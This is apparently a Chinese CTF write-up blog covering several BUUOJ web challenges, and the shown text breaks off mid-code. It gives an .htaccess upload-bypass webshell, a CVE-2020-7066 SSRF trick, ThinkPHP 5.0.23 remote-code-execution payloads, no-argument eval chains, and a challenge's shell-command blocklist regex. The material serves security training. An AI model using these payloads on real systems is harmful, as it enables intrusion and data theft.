{"title":"BUUOJ刷题20201026-31","uid":"1be9c62e526acccb43c839a00721a69f","slug":"BUUOJ刷题20201026-31","date":"2020-10-26T11:30:40.000Z","updated":"2021-06-28T14:58:09.776Z","comments":true,"path":"api/articles/BUUOJ刷题20201026-31.json","keywords":"A1andNS","cover":"https://gitee.com/A1andNS/blogimage/raw/master/img/3.png","content":"<h2 id=\"MRCTF2020-你传你🐎呢\"><a href=\"#MRCTF2020-你传你🐎呢\" class=\"headerlink\" title=\"[MRCTF2020]你传你🐎呢\"></a>[MRCTF2020]你传你🐎呢</h2><p>考点：文件上传、图片马</p>\n<p>上传绕过怎么绕呢，试了上传php,php3，php4，phtml都是没过滤了。试了一下jpg和.htaccess文件都可以上传，所以就可以使用图片马，并且直接给出了路径，友好。</p>\n<p>上传一个.htaccess文件</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">AddType application&#x2F;x-httpd-php .jpg<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>然后上传一个图片马</p>\n<p>antsword去连接一下就好了。     </p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo@master/img/image-20201026201428471.png\" alt=\"image-20201026201428471\"></p>\n<h2 id=\"MRCTF2020-Ez-bypass\"><a href=\"#MRCTF2020-Ez-bypass\" class=\"headerlink\" title=\"[MRCTF2020]Ez_bypass\"></a>[MRCTF2020]Ez_bypass</h2><p>考点：PHP比较绕过</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token constant\">I</span> put something in <span class=\"token constant\">F12</span> <span class=\"token keyword\">for</span> you\n<span class=\"token keyword\">include</span> <span class=\"token string single-quoted-string\">'flag.php'</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$flag</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'MRCTF&#123;xxxxxxxxxxxxxxxxxxxxxxxxx&#125;'</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'gg'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;&amp;</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'id'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token variable\">$id</span><span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'id'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$gg</span><span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'gg'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">md5</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$id</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">===</span> <span class=\"token function\">md5</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$gg</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token variable\">$id</span> <span class=\"token operator\">!==</span> <span class=\"token variable\">$gg</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'You got the first step'</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'passwd'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token variable\">$passwd</span><span class=\"token operator\">=</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'passwd'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">is_numeric</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$passwd</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n            <span class=\"token punctuation\">&#123;</span>\n                 <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$passwd</span><span class=\"token operator\">==</span><span class=\"token number\">1234567</span><span class=\"token punctuation\">)</span>\n                 <span class=\"token punctuation\">&#123;</span>\n                     <span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'Good Job!'</span><span class=\"token punctuation\">;</span>\n                     <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'flag.php'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n                     <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'By Retr_0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n                 <span class=\"token punctuation\">&#125;</span>\n                 <span class=\"token keyword\">else</span>\n                 <span class=\"token punctuation\">&#123;</span>\n                     <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"can you think twice??\"</span><span class=\"token punctuation\">;</span>\n                 <span class=\"token punctuation\">&#125;</span>\n            <span class=\"token punctuation\">&#125;</span>\n            <span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span>\n                <span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'You can not get it !'</span><span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">&#125;</span>\n\n        <span class=\"token punctuation\">&#125;</span>\n        <span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span>\n            <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'only one way to get the flag'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"You are not a real hacker!\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'Please input first'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>Please input first<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo@master/img/image-20201026202353569.png\" alt=\"image-20201026202353569\"></p>\n<h2 id=\"GKCTF2020-cve版签到\"><a href=\"#GKCTF2020-cve版签到\" class=\"headerlink\" title=\"[GKCTF2020]cve版签到\"></a>[GKCTF2020]cve版签到</h2><p>提示是cve-2020-7066</p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>PHP（PHP：Hypertext Preprocessor，PHP：超文本预处理器）是PHPGroup和开放源代码社区的共同维护的一种开源的通用计算机脚本语言。该语言主要用于Web开发，支持多种数据库及操作系统。 PHP 7.2.29之前的7.2.x版本、7.3.16之前的7.3.x版本和7.4.4之前的7.4.x版本中的‘get_headers()’函数存在安全漏洞。攻击者可利用该漏洞造成信息泄露。</p>\n<p>get_headers()会截断URL中空字符后的内容</p>\n<p>这是在php7.3中发现的 ，但是一直有这个漏洞</p>\n<p>测试脚本显示这会让恶意脚本获取意外域名的header 。这些header可能泄露敏感信息或者意外地包含攻击者控制的数据。</p></blockquote>\n<p>看view ctfhub看到了传入到参数url里了。应该是可以ssrf，但是他说只能使用*.ctfhub.com</p>\n<p>HTTP头部显示了Flag in localhost</p>\n<p>试一下<a href=\"http://127.0.0.1%00.ctfhub.com\">http://127.0.0.1%00.ctfhub.com</a></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">Array\n(\n    [0] &#x3D;&gt; HTTP&#x2F;1.1 200 OK\n    [1] &#x3D;&gt; Date: Mon, 26 Oct 2020 14:37:44 GMT\n    [2] &#x3D;&gt; Server: Apache&#x2F;2.4.38 (Debian)\n    [3] &#x3D;&gt; X-Powered-By: PHP&#x2F;7.3.15\n    [4] &#x3D;&gt; Tips: Host must be end with &#39;123&#39;\n    [5] &#x3D;&gt; Vary: Accept-Encoding\n    [6] &#x3D;&gt; Content-Length: 113\n    [7] &#x3D;&gt; Connection: close\n    [8] &#x3D;&gt; Content-Type: text&#x2F;html; charset&#x3D;UTF-8\n)<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>提示host需要以123结尾，所以改一下</p>\n<p><code>http://127.0.0.123%00.ctfhub.com</code></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo@master/img/image-20201026223931681.png\" alt=\"image-20201026223931681\"></p>\n<h2 id=\"BJDCTF-2nd-old-hack\"><a href=\"#BJDCTF-2nd-old-hack\" class=\"headerlink\" title=\"[BJDCTF 2nd]old-hack\"></a>[BJDCTF 2nd]old-hack</h2><p>考点：ThinkPHP</p>\n<p>这里上来就是提示TinkPHP5，所以这里应该是要使用ThinkPHP5的漏洞来做。</p>\n<p>可以到这个网站去找paylod:<a href=\"https://www.exploit-db.com/\">https://www.exploit-db.com/</a></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo@master/img/image-20201027100925222.png\" alt=\"image-20201027100925222\"></p>\n<p>通过报错信息可以知道ThinkPHP的版本为 5.0.23，PHP版本是5.6.40，一些关键路径，web根目录是/var/www/html/，ThinkPHP目录为/var/www/html/thinkphp</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">thinkphp 5.0.23（完整版）debug模式\n32、(post)public&#x2F;index.php (data)_method&#x3D;__construct&amp;filter[]&#x3D;system&amp;server[REQUEST_METHOD]&#x3D;touch%20&#x2F;tmp&#x2F;xxx\n\nthinkphp 5.0.23(完整版)\n33、（post）public&#x2F;index.php?s&#x3D;captcha (data) _method&#x3D;__construct&amp;filter[]&#x3D;system&amp;method&#x3D;get&amp;server[REQUEST_METHOD]&#x3D;ls -al<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>找到了相应payload，这里也可用kali来收集一下。</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo@master/img/image-20201027102455420.png\" alt=\"image-20201027102455420\"></p>\n<p>下面试一下payload:</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">http:&#x2F;&#x2F;0ab0e6ac-e952-404d-9cbc-dbf6d7ec8902.node3.buuoj.cn&#x2F;?s&#x3D;captcha\n#post data content\n_method&#x3D;__construct&amp;filter%5B%5D&#x3D;system&amp;method&#x3D;get&amp;server%5BREQUEST_METHOD%5D&#x3D;ls+&#x2F;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo@master/img/image-20201027102756996.png\" alt=\"image-20201027102756996\"></p>\n<p>改用cat /flag，就可以读到flag。</p>\n<p>这题考察的是ThinkPHP的RCE漏洞，这里就考察到一定的信息收集能力，找到漏洞的利用payload的比较关键。</p>\n<p>当然可以执行命令了，也可以写一个shell进去。</p>\n<h2 id=\"GXYCTF2019-禁止套娃\"><a href=\"#GXYCTF2019-禁止套娃\" class=\"headerlink\" title=\"[GXYCTF2019]禁止套娃\"></a>[GXYCTF2019]禁止套娃</h2><p>考点：.git文件泄露，无参数函数RCE</p>\n<p>打开网页没有找到任何有用信息，使用dirsearch扫描一下后台看看情况，buu对请求数量有限制，这要设置延迟，不然什么都收集不到。</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo@master/img/image-20201027104905111.png\" alt=\"image-20201027104905111\"></p>\n<p>使用githack把目录clone到本地。</p>\n<p>得到index.php的源代码：</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token keyword\">include</span> <span class=\"token string double-quoted-string\">\"flag.php\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"flag在哪里呢？&lt;br>\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'exp'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/data:\\/\\/|filter:\\/\\/|php:\\/\\/|phar:\\/\\//i'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'exp'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">';'</span> <span class=\"token operator\">===</span> <span class=\"token function\">preg_replace</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/[a-z,_]+\\((?R)?\\)/'</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'exp'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/et|na|info|dec|bin|hex|oct|pi|log/i'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'exp'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n                <span class=\"token comment\">// echo $_GET['exp'];</span>\n                @<span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'exp'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">&#125;</span>\n            <span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span>\n                <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"还差一点哦！\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">&#125;</span>\n        <span class=\"token punctuation\">&#125;</span>\n        <span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span>\n            <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"再好好想想！\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"还想读flag，臭弟弟！\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token comment\">// highlight_file(__FILE__);</span>\n<span class=\"token delimiter important\">?></span></span>\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>做了过滤了，data://，filter://，php://，phar://都被过滤了</p>\n<p>(?R)” 来表示嵌套部分，同时还正则匹配了<code>/et|na|info|dec|bin|hex|oct|pi|log/i</code>这就使得很多函数用不了。</p>\n<p>这里匹配要求函数无参数，所以要想办法来获取信息，想办法读取flag.php内容。这里有一个知识点，利用两个函数的嵌套来代替<code>.</code></p>\n<p><code>current(localeconv())</code>,其中localeconv()函数是用来返回一包含本地数字和货币格式信息的数组。</p>\n<p>参考url:<a href=\"https://www.w3school.com.cn/php/func_string_localeconv.asp\">https://www.w3school.com.cn/php/func_string_localeconv.asp</a></p>\n<p>current()函数的作用是输出数组中的当前袁术的值，每个数组中都有一个内部指针指向它的当前元素，初始指向插入到数组中的第一个元素。</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo@master/img/image-20201027115738515.png\" alt=\"image-20201027115738515\"></p>\n<p>所以current(localeconv())实际上就是表示<code>.</code>，因此一个无参数函数就可以构建了，</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">exp&#x3D;print_r(scandir(current(localeconv())));<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo@master/img/image-20201027120022472.png\" alt=\"image-20201027120022472\"></p>\n<p>目录情况就是一个.git + flag.php + index.php了。</p>\n<p>这样可以得到的就是一个数组类型数据，倒数第二个元素就是我们要的flag.php，所以思路和上面是一样的，那么如何返回倒数第二个元素呢？这里就要去查一下数组操作函数有哪些了。</p>\n<p>发现有一个函数是array_rand():从数组中随机选出一个或多个元素，返回键名。</p>\n<h3 id=\"方法一：localeconv\"><a href=\"#方法一：localeconv\" class=\"headerlink\" title=\"方法一：localeconv()\"></a>方法一：localeconv()</h3><p>array_flip():反转/交换数组中的键名和对应关联的键值。</p>\n<p>可以先把键和值交换，然后用array_rand()随机返回键名，这样就可以读出flag.php</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">exp&#x3D;show_source(array_rand(array_flip(scandir(current(localeconv())))));<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo@master/img/image-20201027122156556.png\" alt=\"image-20201027122156556\"></p>\n<h3 id=\"方法二：reverse\"><a href=\"#方法二：reverse\" class=\"headerlink\" title=\"方法二：reverse()\"></a>方法二：reverse()</h3><p>先用array_reverse()函数逆序排列数组，然后结合next()函数把指针后移一位，就得到flag.php，集合show_source()函数就可以读了。</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo@master/img/image-20201027122837096.png\" alt=\"image-20201027122837096\"></p>\n<h3 id=\"方法三：session方法\"><a href=\"#方法三：session方法\" class=\"headerlink\" title=\"方法三：session方法\"></a>方法三：session方法</h3><p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo@master/img/image-20201027203733969.png\" alt=\"image-20201027203733969\"></p>\n<h2 id=\"GXYCTF2019-BabyUpload\"><a href=\"#GXYCTF2019-BabyUpload\" class=\"headerlink\" title=\"[GXYCTF2019]BabyUpload\"></a>[GXYCTF2019]BabyUpload</h2><p>考点：文件上传</p>\n<p>上传PHP提示不能上传后缀不能有ph，大小写后缀绕不过，这样的过滤，一些常用的后最都用不了了。光改后缀为jpg，提示太露骨了，把类型一起改了就提示明明是php，那就一起价格文件头</p>\n<p>经过一番探查发现是<code>&lt;?</code>被过滤了。</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo@master/img/image-20201028193002524.png\" alt=\"image-20201028193002524\"></p>\n<p>使用script脚本方式绕过，成功上传一个图片，看看能不能上传一个.htaccess文件。</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo@master/img/image-20201028193133997.png\" alt=\"image-20201028193133997\"></p>\n<p>antsword连接get flag</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo@master/img/image-20201028193403154.png\" alt=\"image-20201028193403154\"></p>\n<h2 id=\"安洵杯-2019-easy-web\"><a href=\"#安洵杯-2019-easy-web\" class=\"headerlink\" title=\"[安洵杯 2019]easy_web\"></a>[安洵杯 2019]easy_web</h2><p>上来是图片没有上面，看一下源码，里面写着md5 is funny ~，url处传入了一个img和cmd</p>\n<p>img处是一个base64编码：解到最后是3535352e706e67，这是个16进制编码，解开后是555.png，这说明会读取文件以base64形式返回。在cmd处输入命令试试,输入ls，cat，$，显示被禁止。这里可以利用前面的图片点来获取源码，因为之前我们发现imag处传入的是先对文件名进行16进制转换，然后在做两次base64编码，所以我们吧index.php做如上操作，就可以得到源代码。</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">E_ALL</span> <span class=\"token operator\">||</span> <span class=\"token operator\">~</span> <span class=\"token constant\">E_NOTICE</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">header</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'content-type:text/html;charset=utf-8'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$cmd</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'cmd'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'img'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">||</span> <span class=\"token operator\">!</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'cmd'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> \n    <span class=\"token function\">header</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd='</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token function\">hex2bin</span><span class=\"token punctuation\">(</span><span class=\"token function\">base64_decode</span><span class=\"token punctuation\">(</span><span class=\"token function\">base64_decode</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'img'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token function\">preg_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/[^a-zA-Z0-9.]+/\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/flag/i\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'&lt;img src =\"./ctf3.jpeg\">'</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"xixi～ no flag\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token variable\">$txt</span> <span class=\"token operator\">=</span> <span class=\"token function\">base64_encode</span><span class=\"token punctuation\">(</span><span class=\"token function\">file_get_contents</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;img src='data:image/gif;base64,\"</span> <span class=\"token operator\">.</span> <span class=\"token variable\">$txt</span> <span class=\"token operator\">.</span> <span class=\"token string double-quoted-string\">\"'>&lt;/img>\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;br>\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token variable\">$cmd</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;br>\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\\'|\\\"|\\`|;|,|\\*|\\?|\\\\|\\\\\\\\|\\n|\\t|\\r|\\xA0|\\&#123;|\\&#125;|\\(|\\)|\\&amp;[^\\d]|@|\\||\\\\$|\\[|\\]|&#123;|&#125;|\\(|\\)|-|&lt;|>/i\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$cmd</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">echo</span><span class=\"token 